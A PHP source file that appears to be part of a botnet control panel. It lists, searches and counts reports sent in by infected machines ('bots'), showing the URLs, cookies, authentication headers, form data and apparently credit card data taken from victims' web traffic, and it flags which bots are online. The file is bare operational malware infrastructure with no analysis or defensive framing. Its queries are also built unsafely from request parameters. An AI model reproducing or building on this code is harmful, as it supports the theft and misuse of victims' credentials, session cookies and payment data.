<?

if (!CsrConnectToDb()) die();

define("RAW_LENGTH", 110);

if (isset($_GET['do']))
{
	$do = $_GET['do'];
	
	if ($do == 'report')
	{
		$id = $_GET['id'];
		$date = substr($_GET["date"], -2) . substr($_GET["date"], 3, 2) . substr($_GET["date"], 0, 2);
		
		$report = CsrSqlQueryRow("select `bot_id`, `type`, `rtime`, `content` from `reports_" . $date . "` where `id` = " . $id . " limit 1");
		if (!$report) die();
		
		if ($report["type"] == BLT_CC || $report["type"] == BLT_HTTP_REPORT || $report["type"] == BLT_HTTPS_REPORT)
		{
			$headers = array("Url", "Referer", "User-Agent", "Cookie", "Authenticate", "Data");

			$content = '';
			$parts = explode("\n", urldecode($report["content"]));
		
			foreach ($parts as $k => $v)
			{
				$p = explode(':', $v, 2);
				
				if (in_array($p[0], $headers))
				{
					$s = "<b>[" . $p[0] . "]</b>";
					
					if ($p[0] == "Data" && isset($p[1])) 
					{
						$s = '<br/>' . $s . "<br/>";
						$q = explode('&', $p[1]);
					
						for ($i = 0; $i < count($q); ++$i)
						{
							if (!strlen($q[$i])) continue;
						
							$b = explode('=', $q[$i], 2);

							if (isset($b[1])) {
								$raw = '<b>' . trim($b[0]) . '</b>='. $b[1];
							}
							else {
								$raw = '' . trim($b[0]) . '=';
							}

							$s .= SpliceRaw($raw) . "<br>";
						}
					}
					else if ($p[0] == "Cookie" && isset($p[1]))
					{
						$arr = explode(';', $p[1]);
						
						$s = '<br/>' . "<b>[" . $p[0] . "]</b><br/>";
						
						for($i = 0; $i < count($arr); ++$i)
						{
							$k = $arr[$i];
							if (!strlen($k)) continue;
							
							$r = explode('=', $k, 2);
							
							if (isset($r[0]))
							{
								if (isset($r[1]))
									$k = '<b>' . trim($r[0]) . '</b>=' . $r[1];
								else
									$k = '<b>' . trim($r[0]) . '</b>=';
									
								$k = SpliceRaw($k);
							}
							
							if ($i == (count($arr) - 1)) {
								$s .= $k;
							}
							else
								$s .= $k ."<br/>";
						}
					}
					else 
					{
						$s .= SpliceRaw($p[1]);
					}
						
					$content .= $s . '<br/>';
				}
			}
			
			$report['content'] = $content;
		}
		else
		{
			$report["content"] = str_replace("\n", "<br>", urldecode($report["content"]));
		}
		
		$isOnline = CsrSqlQueryRowEx("select (" . CURRENT_TIME . " - `rtime_last`) <= (" . ($config['bot_timeout'] * 60) . " as `isOnline` from `bots` where `bot_id` = \"" . $report["bot_id"] . "\" limit 1");
		
		?>
			<table class="table table-striped table-bordered table-condensed table-hover">
				<tr>
					<td> Bot id: </td> <td><a href="?act=bot&id=<?=$report["bot_id"]?>" target='_blank'> <?=$report["bot_id"]?> <?=$isOnline ? " <font color=green>(Online)</font>" : ""?> </a> </td>
				</tr>
				<tr>
					<td> Time created: </td> <td><?=gmdate("d-m-Y H:i:s", $report["rtime"])?></td>
				</tr>
				<tr>
					<td colspan='2'> <?=$report['content']?> </td>
				</tr>
			</table>
		<?
	}
	else if ($do == 'reports')
	{
		define('LIMIT_PAGE', 20);
		define('LIMIT_REPORTS', 1024);

		if (isset($_GET["session"]) && intval($_GET["session"]) > 0)
		{
			$sess = intval($_GET["session"]);
			$reports = unserialize(file_get_contents('tmp/' . $sess . ".sess"));
			$page = CsrNavigationGetPage();
			
			$res = array();
			$res["nav"] = CsrNavigation(preg_replace("/&page=(\d+)/", "", $_GET["url"]), count($reports), LIMIT_REPORTS, LIMIT_PAGE);
			$res["reports"] = array_slice($reports, ($page - 1) * LIMIT_REPORTS, LIMIT_REPORTS);
			
			die(json_encode($res));
		}
		
		$tables = array();
		$tmp_tables = CsrListTables();
		
		foreach ($tmp_tables as $table) 
		{
			$v = intval(substr($table, -6));
			
			if ($v > 0 && $v >= (int)$_GET["date_from"] && $v <= (int)$_GET["date_to"])
				$tables[] = $v;
		}
		
		$tables = array_reverse($tables);
		$bots = array();
		$contents = "";
		$isExcludeContent = false;
		$isOnlineOnly = false;
		$isPlainText = false;
		
		if (!empty($_GET["bots"])) $bots = explode(" ", trim($_GET["bots"]));
		if (!empty($_GET["contents"])) $contents = explode(" ", trim($_GET["contents"]));
		if (!empty($_GET["exclude_content"]) && $_GET["exclude_content"] == "on") 
			$isExcludeContent = true;
		
		if (!empty($_GET["plain_text"]) && $_GET["plain_text"] == "on") 
			$isPlainText = true;
		
		if (!empty($_GET["online_only"]) && $_GET["online_only"] == "on") 
		{
			$isOnlineOnly = true;
		}
			
		$sql = "";
		$typeReport = intval($_GET['type']);
		if ($typeReport > 0) {
			$sql .= "(`type` = {$typeReport})";
		}
		
		if (!empty($bots)) 
		{		
			$sql .= "(";
			foreach ($bots as $bot) {
				$sql .= "`bot_id` LIKE '" . str_replace("*", "%", $bot) . "' OR ";
			}
			$sql = substr($sql, 0, -4);
			$sql .= ")";
		}
			
		if (!empty($contents)) 
		{
			if (!empty($sql)) $sql .= " AND ";
		
			$sql .= "(";
			foreach ($contents as $content) 
			{
				$sql .= '`path` LIKE \'%' . str_replace("*", "%", $content) . '%\' OR ';
				
				$sql .= '`content` LIKE \'%' . str_replace("*", "%", $content) . '%\' OR ';
			}
			$sql = substr($sql, 0, -4);
			$sql .= ")";
		}
			
		if ((int)$_GET["date_from"] > (int)$_GET["date_to"]) {
			$tmp = $_GET["date_to"];
			$_GET["date_to"] = $_GET["date_from"];
			$_GET["date_from"] = $tmp;
		}
		
		$onlineBots = array();
		if ($isOnlineOnly)
		{			
			$onlineBots = CsrSqlQueryRows("select `bot_id` from `bots` where `rtime_last` >= " . (CURRENT_TIME - ($config["bot_timeout"] * 60)) . "");
		}
		
		$reports = array();
		foreach ($tables as $table) 
		{
			$res = false;
			$sql_table = "reports_" . $table;
			$date = substr($table, 4, 2) . "." . substr($table, 2, 2) . ".20" . substr($table, 0, 2);
			
			if ($isOnlineOnly)
			{
				foreach ($onlineBots as $bot)
				{
					if ($isPlainText) {
						$s = "select `content` from `{$sql_table}` where `bot_id` = '" . $bot["bot_id"] . "' and " . $sql . (($isExcludeContent === true) ? " group by `content`" : "") . " order by `bot_id`, `rtime`";
					}
					else {
						$s = "select `id`, `bot_id`, `path`, `rtime`, `type`, '{$date}' as `date` from `{$sql_table}` where `bot_id` = '" . $bot["bot_id"] . "' and " . $sql . (($isExcludeContent === true) ? " group by `content`" : "") . " order by `bot_id`, `rtime`";
					}
				}
			}
			else 
			{
				if ($isPlainText) {
					$s = "select `content` from `{$sql_table}` " . (!empty($sql) ? ( " where " . $sql ) : "" ) . (($isExcludeContent === true) ? " group by `content`" : "") . " order by `bot_id`, `rtime`";
				} else {
					$s = "select `id`, `bot_id`, `path`, `rtime`, `type`, '{$date}' as `date` from `{$sql_table}` " . (!empty($sql) ? ( " where " . $sql ) : "" ) . (($isExcludeContent === true) ? " group by `content`" : "") . " order by `bot_id`, `rtime`";	
				}
			}
			
			$res = CsrSqlQueryRows($s);	
			
			if ($res)
				$reports = array_merge($reports, $res);
		}
		
		if ($isPlainText) 
		{
			foreach ($reports as $report)
			{
				$content = urldecode($report["content"]);
				$content = str_replace("\n", "</br>", $content);
				echo $content . "</br></br>";
			}
			
			die();
		}
		
		$sess = rand(1024, 1024 * 1024);
		file_put_contents('tmp/' . $sess . ".sess", serialize($reports));
		
		$response["nav"] = CsrNavigation(preg_replace("/&page=(\d+)/", "", $_GET["url"]) . "&session=" . $sess, count($reports), LIMIT_REPORTS, LIMIT_PAGE);
		$response["reports"] = array_slice($reports, 0, LIMIT_REPORTS);
		
	
		die(json_encode($response));
	}
	else if ($do == 'stats_reports')
	{
		$cnt_reports = 0;
		$cnt_http_reports = 0;
		$cnt_https_reports = 0;
		$cnt_gd_reports = 0;
		$cnt_cc_reports = 0;

		$tables = CsrListTables();
		foreach ($tables as &$table) 
		{
			$v = intval(substr($table, -6));
			
			if ($v > 0) {
				$report_table = 'reports_' . $v;
				$cnt_reports += CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "`");
				$cnt_http_reports += CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "` where `type` = " . BLT_HTTP_REPORT . "");
				$cnt_https_reports += CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "` where `type` = " . BLT_HTTPS_REPORT . "");
				$cnt_gd_reports += CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "` where `type` = " . BLT_GD_REPORT . "");
				$cnt_cc_reports += CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "` where `type` = " . BLT_CC . "");
			}
		}

		$report_table = 'reports_' . gmdate('ymd');

		$cnt_reports_today = CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "`");
		if (!$cnt_reports_today) 
			$cnt_reports_today = 0;

		$cnt_http_reports_today = CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "` where `type` = " . BLT_HTTP_REPORT . "");
		if (!$cnt_http_reports_today) 
			$cnt_http_reports_today = 0;

		$cnt_https_reports_today = CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "` where `type` = " . BLT_HTTPS_REPORT . "");
		if (!$cnt_https_reports_today) 
			$cnt_https_reports_today = 0;
		
		$cnt_gd_reports_today = CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "` where `type` = " . BLT_GD_REPORT . "");
		if (!$cnt_gd_reports_today) 
			$cnt_gd_reports_today = 0;
		
		$cnt_cc_reports_today = CsrSqlQueryRowEx("select count(*) as `cnt` from `" . $report_table . "` where `type` = " . BLT_CC . "");
		if (!$cnt_cc_reports_today) 
			$cnt_cc_reports_today = 0;
		
		/*
					<tr>
							<td> CC </td>			
							<td> {$cnt_cc_reports} (" . GetPercent($cnt_cc_reports, $cnt_reports) . "%) </td>
							<td> <font color='green'> " . ($cnt_cc_reports_today) . " </font> </td>
						</tr>
		*/
		
		$html = "<tr>
							<td> Http </td>
							<td> {$cnt_http_reports} (" . GetPercent($cnt_http_reports, $cnt_reports) . "%) </td>
							<td> <font color='green'> {$cnt_http_reports_today} </font> </td>
						</tr>
						<tr>
							<td> Https </td>			
							<td> {$cnt_https_reports} (" . GetPercent($cnt_https_reports, $cnt_reports) . "%) </td>
							<td> <font color='green'> {$cnt_https_reports_today} </font> </td>
						</tr>
			
						<tr>
							<td> GD </td>			
							<td> {$cnt_gd_reports} (" . GetPercent($cnt_gd_reports, $cnt_reports) . "%) </td>
							<td> <font color='green'> " . ($cnt_gd_reports_today) . " </font> </td>
						</tr>
						<tr>
							<td> </td>			
							<td> {$cnt_reports} </td>
							<td> <font color='green'> " . ($cnt_http_reports_today + $cnt_https_reports_today + $cnt_gd_reports_today) . " </font> </td>
						</tr>";
				
		die($html);
	}
}

function SpliceRaw($v)
{
	$s = '';
	$num = strlen($v) / RAW_LENGTH;
	for ($i = 0; $i < $num; ++$i) 
	{
		if ((strlen($v) - RAW_LENGTH * $i) > RAW_LENGTH)
			$s .= substr($v, $i * RAW_LENGTH, RAW_LENGTH) . '<br/>';
		else
			$s .= substr($v, $i * RAW_LENGTH, RAW_LENGTH);
	}
	
	return $s;
}

function WriteLog($s) {
/*
	$logFp = fopen("log.txt", "a+");
	fwrite($logFp, $s . ".\r\n");
	fclose($logFp);
*/
}

die();
?>